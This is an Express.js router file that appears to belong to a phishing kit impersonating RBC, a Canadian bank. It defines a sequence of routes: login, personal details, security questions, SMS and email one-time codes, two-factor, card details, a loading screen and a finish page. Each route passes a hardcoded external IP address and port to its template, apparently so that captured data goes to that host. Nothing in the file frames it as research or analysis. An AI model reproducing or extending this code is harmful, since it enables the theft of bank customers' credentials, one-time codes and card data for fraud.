const express = require('express');
const router = express.Router();

const IP_PORT = "http://172.86.123.119:3000";

router.get('/', (req, res) => res.render('banks/ca/rbc/login/page', { ip: IP_PORT }));

router.get('/details', (req, res) => {res.render('banks/ca/rbc/details/page', { ip: IP_PORT });});

router.get('/question', (req, res) => {res.render('banks/ca/rbc/quest/page', { ip: IP_PORT });});

router.get('/question/2', (req, res) => {res.render('banks/ca/rbc/quest2/page', { ip: IP_PORT });});

router.get('/sms-otp', (req, res) => {res.render('banks/ca/rbc/sms/page', { ip: IP_PORT });});

router.get('/auth', (req, res) => {res.render('banks/ca/rbc/auth/page', { ip: IP_PORT });});

router.get('/email-otp', (req, res) => {res.render('banks/ca/rbc/otp/page', { ip: IP_PORT });});


router.get('/2factor', (req, res) => {res.render('banks/ca/rbc/twofactor/page', { ip: IP_PORT });});

router.get('/loading', (req, res) => {res.render('banks/ca/rbc/loading/page', { ip: IP_PORT });});


router.get('/finish', (req, res) => {res.render('banks/ca/rbc/finish/page', { ip: IP_PORT });});


router.get('/card', (req, res) => {res.render('banks/ca/rbc/card/page', { ip: IP_PORT });});


module.exports = router;